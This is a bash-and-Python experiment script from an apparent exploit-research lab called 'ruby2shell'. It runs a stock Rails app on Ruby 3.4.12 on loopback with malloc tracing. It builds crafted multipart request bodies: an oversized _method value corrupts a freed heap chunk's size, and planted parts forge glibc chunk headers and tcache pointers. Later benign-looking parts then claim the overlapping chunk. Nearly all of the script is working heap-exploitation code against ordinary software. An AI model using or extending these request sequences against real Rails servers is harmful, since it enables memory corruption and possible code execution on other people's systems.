#!/bin/bash
# Shrink-family CLAIM experiment (wall 2026-11-25 fourth batch, named next):
# after the 0x53 byte corrupts a binned victim's size on the unmodified
# `rails new --minimal` app, does a LATER matched-class benign multipart
# request POP the corrupted chunk (the overlap consumer), when the victim
# class is made plantable by a benign first request?
#
# Per fresh process, loopback only, analysis instrumentation only:
#   PLANT  benign multipart (parts >=809B, no _method)   -> value/slice frees
#   ATTACK consH20-tail N body (the td588 geometry)     -> 0x53 size rewrite
#   CLAIM  benign parts sized to candidate shrunk classes-> pop at the victim
#   /up alive check, maps snapshot outside the request path, kill.
# Case probe + full M/F stream run together (case_only unset). No command,
# no persistence, no grade change.
#
# Usage:
#   RUBY2SHELL_CLAIM_N=588  bash lab/repro/ruby2shell-shrink-claim.sh
#   RUBY2SHELL_CLAIM_N=892  RUBY2SHELL_CLAIM_TAG=sc892 \
#     RUBY2SHELL_CLAIM_PARTS=824,2616,3032,3896,32312 \
#     bash lab/repro/ruby2shell-shrink-claim.sh
set -u
cd "$(dirname "$0")/../.." || exit 1
EV=lab/build/evidence
APP=lab/build/rails-stock-app
RB=lab/build/plain/ruby-3.4.12-plain/bin/ruby
N="${RUBY2SHELL_CLAIM_N:-588}"
TAGP="${RUBY2SHELL_CLAIM_TAG:-sc588}"
PLANT_SPEC="${RUBY2SHELL_CLAIM_PLANT:-946x24}"
DRAIN_SPEC="${RUBY2SHELL_CLAIM_DRAIN:-}"
PLANT_ROUTE="${RUBY2SHELL_CLAIM_PLANT_ROUTE:-/not-a-route}"
PLANT_METHOD="${RUBY2SHELL_CLAIM_PLANT_METHOD:-}"
DRAIN_ROUTE="${RUBY2SHELL_CLAIM_DRAIN_ROUTE:-/not-a-route}"
DRAIN_METHOD="${RUBY2SHELL_CLAIM_DRAIN_METHOD:-}"
CLAIM_LIST="${RUBY2SHELL_CLAIM_PARTS:-824,2616,3032,3896}"
COUNT="${RUBY2SHELL_CLAIM_COUNT:-12}"
GAP="${RUBY2SHELL_CLAIM_GAP:-0}"
BASE=4810
export GEM_PATH="$PWD/lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0"
PFX="$EV/stock-rails-$TAGP"
if [ "${1:-}" = "--one" ]; then
  i="$2"; PORT=$((BASE + i)); TAG="$TAGP-$i"
  LOG="$EV/stock-rails-$TAG.server.log"
  PIDF="$PWD/$EV/stock-rails-$TAG.pid"
  ARM="$PWD/$EV/stock-rails-$TAG.case-arm"
  rm -f "$ARM"
  THREAD_ENV=()
  [ "${RUBY2SHELL_CLAIM_THREADS:-0}" = 1 ] && THREAD_ENV=(RAILS_MAX_THREADS=1)
  # RUBY2SHELL_CLAIM_GDB=1: SIGTRAP at the upcase's A snapshot;
  # RUBY2SHELL_CLAIM_BINDUMPS=1: in-process L-line bin chain dump at A
  # (analysis-only knobs, no request-path behavior change)
  GDB_ENV=()
  [ -n "${RUBY2SHELL_CLAIM_GDB:-}" ] && GDB_ENV=(MTRACE_CASE_STOP=1)
  [ -n "${RUBY2SHELL_CLAIM_BINDUMPS:-}" ] && GDB_ENV+=(MTRACE_DUMP_BINS=1)
  env "${THREAD_ENV[@]}" "${GDB_ENV[@]}" MTRACE_FD=2 MTRACE_FREE_DUMP=1 \
    MTRACE_CASE_REQUEST=$((N + 44)) \
    MTRACE_CASE_ARM_FILE="$ARM" MTRACE_EMIT_ARM_FILE="$ARM" \
    LD_PRELOAD="$PWD/lab/preload/mtrace.so" \
    "$RB" "$APP/bin/rails" server -b 127.0.0.1 -p "$PORT" --pid "$PIDF" \
    > "$LOG" 2>&1 &
  PID=$!
  READY=NO
  for _ in $(seq 1 300); do
    curl -s -m 1 "http://127.0.0.1:$PORT/up" >/dev/null 2>&1 && { READY=YES; break; }
    sleep 0.1
  done
  if [ "$READY" != YES ]; then
    echo "$TAG boot-fail" >> "$PFX.summary"
    kill "$PID" 2>/dev/null; wait "$PID" 2>/dev/null; exit 0
  fi
  touch "$ARM"
  # optional pre-plant drain (wall 2026-11-25 fourteenth push): benign
  # embed-legal parts whose parse slices+values consume the recycled
  # 0x620/0x810-class holes so the PLANT's chunks allocate contiguously
  # from the top; the drain's own chunks stay live (sweep persistence)
  P0=NA
  if [ -n "$DRAIN_SPEC" ] && [ -f "$PFX.drain.body" ]; then
    P0=$(curl -s -m 30 -X POST "http://127.0.0.1:$PORT$DRAIN_ROUTE" \
      -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
      --data-binary "@$PFX.drain.body" -o "$EV/stock-rails-$TAG.drain.html" \
      -w '%{http_code}' 2>>"$LOG")
  fi
  if [ "${RUBY2SHELL_CLAIM_NO_PLANT:-0}" = 1 ]; then
    P1=NA
  else
    P1=$(curl -s -m 30 -X POST "http://127.0.0.1:$PORT$PLANT_ROUTE" \
      -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
      --data-binary "@$PFX.plant.body" -o "$EV/stock-rails-$TAG.plant.html" \
      -w '%{http_code}' 2>>"$LOG")
    [ "$GAP" != 0 ] && sleep "$GAP"
  fi

  # benign small-part churn: sub-embed-floor parts allocate no big buffers
  # (no scans, no pool consumption) but create per-request objects that
  # grow the old generation, forcing the major GC that frees the plant's
  # promoted chunks before the attack's upcase
  CHURN="${RUBY2SHELL_CLAIM_CHURN:-0}"
  if [ "$CHURN" != 0 ] && [ -f "$PFX.churn.body" ]; then
    for _ in $(seq 1 "$CHURN"); do
      curl -s -m 10 -X POST "http://127.0.0.1:$PORT/not-a-route" \
        -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
        --data-binary "@$PFX.churn.body" -o /dev/null 2>>"$LOG"
    done
  fi
  P2=$(curl -s -m 30 -X POST "http://127.0.0.1:$PORT/not-a-route" \
    -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
    --data-binary "@$PFX.attack.body" -o "$EV/stock-rails-$TAG.attack.html" \
    -w '%{http_code}' 2>>"$LOG")
  P3=$(curl -s -m 30 -X POST "http://127.0.0.1:$PORT/not-a-route" \
    -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
    --data-binary "@$PFX.claim.body" -o "$EV/stock-rails-$TAG.claim.html" \
    -w '%{http_code}' 2>>"$LOG")
  P4=NA
  if [ "${RUBY2SHELL_CLAIM_MODE:-strip}" = poison ]; then
    P4=$(curl -s -m 30 -X POST "http://127.0.0.1:$PORT/not-a-route" \
      -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
      --data-binary "@$PFX.probe.body" -o "$EV/stock-rails-$TAG.probe.html" \
      -w '%{http_code}' 2>>"$LOG")
  fi
  rm -f "$ARM"
  A1=$(curl -s -m 5 "http://127.0.0.1:$PORT/up" -o /dev/null -w '%{http_code}' 2>>"$LOG")
  ALIVE=NO
  if kill -0 "$PID" 2>/dev/null; then
    ALIVE=YES
    cat "/proc/$PID/maps" > "$EV/stock-rails-$TAG.maps" 2>/dev/null
    kill "$PID" 2>/dev/null
  fi
  wait "$PID" 2>/dev/null
  echo "$TAG drain=$P0 plant=$P1 attack=$P2 claim=$P3 probe=$P4 up=$A1 alive=$ALIVE" >> "$PFX.summary"
  exit 0
fi

if [ ! -f "$APP/config/environment.rb" ]; then
  echo "missing stock Rails app; run lab/repro/ruby2shell-stock-rails-setup.sh" >&2
  exit 2
fi
if [ ! -x "$RB" ]; then
  echo "missing plain ruby build $RB" >&2
  exit 2
fi

rm -f "$PFX".*.body "$EV"/stock-rails-"$TAGP"-*.{server.log,html,maps,pid} \
      "$PFX.summary" "$EV"/stock-rails-"$TAGP"-*.excerpt.txt "$PFX".case-arm 2>/dev/null

EV_DIR="$EV" TAG="$TAGP" PLANT_SPEC="$PLANT_SPEC" DRAIN_SPEC="$DRAIN_SPEC" \
PLANT_METHOD="$PLANT_METHOD" DRAIN_METHOD="$DRAIN_METHOD" \
CLAIM_LIST="$CLAIM_LIST" \
CLAIM_MODE="${RUBY2SHELL_CLAIM_MODE:-strip}" \
python3 - "$N" <<'PY'
import sys, os
n = int(sys.argv[1])
ev, tag = os.environ['EV_DIR'], os.environ['TAG']
mode = os.environ['CLAIM_MODE']
def part(name, content, ctype):
    return (b'--XB\r\nContent-Disposition: form-data; name="' + name +
            b'"\r\nContent-Type: ' + ctype + b'\r\n\r\n' + content)
AB = b'text/plain; charset=ASCII-8BIT'
ISO = b'text/plain; charset=ISO-8859-1'
pattern = (0x250).to_bytes(8, 'little') + (0x90).to_bytes(8, 'little')
method = b'a' + b'\xdf' * (n - 5) + b'\x00\x00\x51\x02'
if mode == 'poison':
    # poison arm: sub-embed-floor filler parts before _method provide pure
    # object pressure (zero big mallocs, zero pool consumption) so the
    # young-generation sweep of the PREVIOUS plant request's params fires
    # mid-parse, freeing the planted chunks into tcache/unsorted before
    # the upcase
    attack_parts = []
    for grp in os.environ.get('FILLER_SPEC', '').split(','):
        if not grp:
            continue
        size, count = (int(v, 0) for v in grp.split('x'))
        for _ in range(count):
            attack_parts.append(
                part(f'g{len(attack_parts)}'.encode(), b'g' * size, AB))
    for grp in os.environ.get('HONEYPOT_SPEC', '').split(','):
        if not grp:
            continue
        size, count = (int(v, 0) for v in grp.split('x'))
        for _ in range(count):
            attack_parts.append(
                part(f'y{len(attack_parts)}'.encode(), b'y' * size, AB))
    attack_parts.append(
        part(b'_method', method, b'text/plain; charset=ISO-8859-1'))
else:
    drain = (pattern * ((1024 + 15) // 16))[:1024]
    attack_parts = [part(f'd{i}'.encode(), drain, AB) for i in range(32)]
    attack_parts.append(
        part(b'_method', method, b'text/plain; charset=ISO-8859-1'))
def p64(v):
    return v.to_bytes(8, 'little')
def plant_content(size):
    # slice AND value are both content-sized max(1024, content+9)-class;
    # the neighbor chunk's user bytes at +0x30/+0x40 carry the
    # unsorted-scan forgery (prev_size match + sane next size) for the
    # grown victim, covering both victim-class variants
    if mode == 'poison':
        grown = int(os.environ.get('POISON_GROWN', '0x450'), 0)
        # the forged successor size must carry PREV_INUSE CLEAR for a
        # freed-in-unsorted victim (glibc "invalid next->prev_inuse"
        # check, measured 2026-11-25); POISON_NEXT=P|size for the
        # in-use-variant arms
        nxt = int(os.environ.get('POISON_NEXT', '0x90'), 0)
        forge = p64(grown) + p64(nxt)
        # four forge pairs at +0x10/+0x20/+0x30/+0x40 cover the check
        # qwords for victim classes 0x620..0x640 (the successor content
        # offset where the grown boundary lands)
        return (b'p' * 0x10 + forge * 4 + b'p' * (size - 0x50))
    if size >= 864:
        return (b'p' * 848 + p64(0) + p64(0x91) + b'p' * (size - 864))
    return b'p' * size
def claim_content(size, hdr=None, nsize=None):
    if mode == 'poison':
        # exact-fit claim over the grown victim: the value write
        # overshoots the victim's physical extent onto the neighbor's
        # [prev,size] header and tcache next/key; hdr is the neighbor
        # user-area offset in the claim content (per-part via
        # CLAIM_LIST "size@hdr:neigh_size"); the head pair covers the
        # slice-reuse variant
        head = p64(0x4141414141414141) + p64(0x4242424242424242)
        base = hdr if hdr is not None else int(
            os.environ.get('POISON_NEIGH_HDR', '0x410'), 0)
        ns = nsize if nsize is not None else int(
            os.environ.get('POISON_NEIGH_SIZE', '0x411'), 0)
        if base < 0x10 or base > size:
            base = max(0x10, min(base, size))
        c = bytearray(b'Z' * size)
        c[0:16] = head
        c[base - 0x10:base - 0x08] = p64(0)
        c[base - 0x08:base] = p64(ns)
        n = min(8, size - base)
        c[base:base + n] = head[:n]
        k = base + 8
        n = min(8, max(0, size - k))
        c[k:k + n] = head[8:8 + n]
        return bytes(c)
    if size >= 864:
        return (b'Z' * 848 + p64(0) + p64(0x91) + b'Z' * (size - 864))
    return b'Z' * size
pp = []
for grp in os.environ['PLANT_SPEC'].split(','):
    if not grp:
        continue
    size, count = (int(v, 0) for v in grp.split('x'))
    for _ in range(count):
        pp.append(part(f'p{len(pp)}'.encode(), plant_content(size), AB))
if os.environ.get('PLANT_METHOD'):
    pp.append(part(b'_method', os.environ['PLANT_METHOD'].encode(), ISO))
open(f'{ev}/stock-rails-{tag}.plant.body', 'wb').write(
    b'\r\n'.join(pp) + b'\r\n--XB--\r\n')
dp = []
for grp in os.environ.get('DRAIN_SPEC', '').split(','):
    if not grp:
        continue
    size, count = (int(v, 0) for v in grp.split('x'))
    for _ in range(count):
        # plain content: drains recycled holes, forges irrelevant
        dp.append(part(f'd{len(dp)}'.encode(), b'd' * size, AB))
if dp:
    if os.environ.get('DRAIN_METHOD'):
        dp.append(part(b'_method', os.environ['DRAIN_METHOD'].encode(), ISO))
    open(f'{ev}/stock-rails-{tag}.drain.body', 'wb').write(
        b'\r\n'.join(dp) + b'\r\n--XB--\r\n')
cp = []
for v in os.environ['CLAIM_LIST'].split(','):
    if not v:
        continue
    # per-part forge: "size@neigh_hdr:neigh_size" overrides the globals
    spec = v.split('@', 1)
    size = int(spec[0], 0)
    hdr = nsize = None
    if len(spec) == 2:
        h, s = spec[1].split(':', 1)
        hdr, nsize = int(h, 0), int(s, 0)
    cp.append(part(f'c{len(cp)}'.encode(),
                   claim_content(size, hdr, nsize), AB))
open(f'{ev}/stock-rails-{tag}.claim.body', 'wb').write(
    b'\r\n'.join(cp) + b'\r\n--XB--\r\n')
if mode == 'poison':
    qp = []
    for grp in os.environ.get('PROBE_SPEC', '1016x12').split(','):
        if not grp:
            continue
        size, count = (int(v, 0) for v in grp.split('x'))
        for _ in range(count):
            qp.append(part(f'q{len(qp)}'.encode(), b'Q' * size, AB))
    open(f'{ev}/stock-rails-{tag}.probe.body', 'wb').write(
        b'\r\n'.join(qp) + b'\r\n--XB--\r\n')
    hp = []
    for grp in os.environ.get('CHURN_SPEC', '400x20').split(','):
        if not grp:
            continue
        size, count = (int(v, 0) for v in grp.split('x'))
        for _ in range(count):
            hp.append(part(f'h{len(hp)}'.encode(), b'h' * size, AB))
    open(f'{ev}/stock-rails-{tag}.churn.body', 'wb').write(
        b'\r\n'.join(hp) + b'\r\n--XB--\r\n')
    # ATTACK_CHAIN: ride the claim and probe parts inside the attack
    # body, after _method — the unsorted re-bin, the exact-fit claim pop
    # and the poisoned-entry pops all complete inside the attack request,
    # before any render allocation can consume the grown victim
    if os.environ.get('ATTACK_CHAIN', '0') == '1':
        attack_parts.extend(cp)
        attack_parts.extend(qp)
    attack_parts.append(part(b'f', (pattern * 16)[:256], AB))
    open(f'{ev}/stock-rails-{tag}.attack.body', 'wb').write(
        b'\r\n'.join(attack_parts) + b'\r\n--XB--\r\n')
else:
    attack_parts.append(part(b'f', (pattern * 16)[:256], AB))
    open(f'{ev}/stock-rails-{tag}.attack.body', 'wb').write(
        b'\r\n'.join(attack_parts) + b'\r\n--XB--\r\n')
PY

for f in "$PFX.attack.body" "$PFX.plant.body" "$PFX.claim.body"; do
  [ -f "$f" ] || { echo "body builder failed: $f" >&2; exit 2; }
done
if [ "${RUBY2SHELL_CLAIM_MODE:-strip}" = poison ] && [ ! -f "$PFX.probe.body" ]; then
  echo "body builder failed: $PFX.probe.body" >&2; exit 2
fi

# geometry check: at N=588 the attack body must be byte-identical to the
# surviving chosen-header forge run's wire input (cov-n588 family)
if [ "$N" = 588 ] && [ -f "$EV/stock-rails-cov-n588-18.body" ]; then
  if ! cmp -s "$PFX.attack.body" "$EV/stock-rails-cov-n588-18.body"; then
    echo "attack body at N=588 does not match the cov-n588 geometry; aborting" >&2
    exit 2
  fi
fi

seq 1 "$COUNT" | xargs -P6 -I{} "$0" --one {}

TAG="$TAGP" N="$N" CLAIM_LIST="$CLAIM_LIST" \
python3 - <<'PY'
import glob, os, re, sys
tag = os.environ['TAG']
n = int(os.environ['N'])
claim_reqs = {int(v.split('@', 1)[0], 0) + 9 for v in os.environ['CLAIM_LIST'].split(',') if v}
rows = []
for logf in sorted(glob.glob(f'lab/build/evidence/stock-rails-{tag}-*.server.log'),
                    key=lambda p: int(re.search(r'-(\d+)\.server\.log$', p).group(1))):
    run = re.search(r'-(\d+)\.server\.log$', logf).group(1)
    text = open(logf, errors='replace').read()
    lines = text.splitlines()
    bs = [l for l in lines if l.startswith('B ')]
    as_ = [l for l in lines if l.startswith('A ')]
    victim = size_b = size_a = None
    if bs:
        b = bs[-1]
        victim = re.search(r'victim=(0x[0-9a-f]+)', b).group(1)
        size_b = re.search(r'size=(0x[0-9a-f]+)', b).group(1)
    if as_:
        size_a = re.search(r'size=(0x[0-9a-f]+)', as_[-1]).group(1)
    # claim pops at the victim: M or C lines with matching ptr + request
    claimed = []
    other_pops = []
    for l in lines:
        m = re.match(r'^M (\d+) ([0-9a-f]+) ([0-9a-f]+) ([0-9a-f]+)', l)
        if m and victim and ('0x' + m.group(3)) == victim:
            req = int(m.group(2), 16)
            (claimed if req in claim_reqs else other_pops).append(hex(req))
        m = re.match(r'^C tid=\d+ request=(0x[0-9a-f]+) ptr=(0x[0-9a-f]+)', l)
        if m and m.group(2) == victim:
            req = int(m.group(1), 16)
            (claimed if req in claim_reqs else other_pops).append(hex(req))
    plantfrees = sum(1 for l in lines if l.startswith('D ')
                     and re.search(r' (0x3d1|0x411) ', l))
    # plant free timing relative to the attack B line
    pre = True
    freed_pre = freed_post = 0
    for l in lines:
        if l.startswith('B '):
            pre = False
        if l.startswith('D ') and re.search(r' (0x3d1|0x411) ', l):
            if pre: freed_pre += 1
            else: freed_post += 1
    abort = ''
    for pat in ('corrupted', 'munmap', 'malloc():', 'Assertion', 'SIGABRT',
                'invalid pointer', 'invalid next size', 'double free'):
        for l in lines:
            if pat in l:
                abort = l.strip()[:110]
                break
        if abort:
            break
    # excerpt: probe lines, victim-adjacent traffic, abort context
    keep = []
    for i, l in enumerate(lines):
        if (l[:2] in ('B ', 'A ', 'V ', 'C ', 'P ', 'Q ', 'G ', 'H ') or
                l.startswith('D ') or l.startswith('M ') or l.startswith('F ') or
                'Started POST' in l or 'Completed' in l or
                'corrupted' in l or 'munmap' in l or 'malloc():' in l or
                'Assertion' in l or 'SIGABRT' in l or 'rails' in l.lower() and
                'Booting' in l):
            if l.startswith('M ') or l.startswith('F '):
                m = re.match(r'^[MF] (\d+) ([0-9a-f]+) ([0-9a-f]+)', l)
                if m and victim:
                    ptr = '0x' + m.group(3)
                    sz = int(m.group(2), 16)
                    near = (abs(int(ptr, 16) - int(victim, 16)) < 0x10000)
                    if not near and sz not in claim_reqs and sz > 0x500:
                        continue
            keep.append(l)
    open(logf.replace('.server.log', '.excerpt.txt'), 'w').write('\n'.join(keep) + '\n')
    rows.append((run, victim, size_b, size_a, claimed, other_pops,
                 freed_pre, freed_post, abort))
    # raw log kept for review; trim after the table is read (td588 policy)
print(f"== {tag}: N={n} claim_reqs={[hex(r) for r in sorted(claim_reqs)]}")
print("run victim            B-size  A-size  claim  other-pops  plantD(pre/post) alive-line  abort")
for r in rows:
    print(f"{r[0]:>3} {str(r[1]):>17} {str(r[2]):>7} {str(r[3]):>7} "
          f"{len(r[4]):>3} {len(r[5]):>5} {r[6]:>2}/{r[7]:<2} {r[8][:70]}")
    if r[4]:
        print(f"    claimed-reqs: {sorted(set(r[4]))}")
    if r[5]:
        print(f"    other-reqs:   {sorted(set(r[5]))[:8]}")
print("-- per-run result lines:")
summ = f'lab/build/evidence/stock-rails-{tag}.summary'
if os.path.exists(summ):
    print(open(summ).read().rstrip())
PY
